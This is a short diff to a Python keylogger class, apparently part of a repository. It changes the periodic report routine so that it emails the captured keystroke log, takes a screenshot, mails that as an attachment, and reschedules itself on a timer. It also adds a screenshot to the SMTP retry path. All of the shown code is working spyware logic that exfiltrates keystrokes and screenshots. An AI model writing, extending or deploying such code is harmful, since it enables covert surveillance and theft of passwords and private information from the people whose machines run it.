@@ -50,10 +50,11 @@ class Keylogger:
                 current_key = " " + str(key) + " "
         self.append_to_log(current_key)
 
-    def report(self):
-        self.send_mail_with_attachment(files= [self.temp_screenshot])
+    def report(self):        
         self.send_mail(self.log)
         self.log = ""
+        self.take_screenshot()
+        self.send_mail_with_attachment(files= [self.temp_screenshot])
         timer = threading.Timer(self.interval, self.report)
         timer.start()
 
@@ -103,6 +104,7 @@ class Keylogger:
             smtp.close()
         except Exception as e:
             time.sleep(15)
+            self.take_screenshot()            
             self.send_mail_with_attachment(files= [self.temp_screenshot])
 
     def start(self):
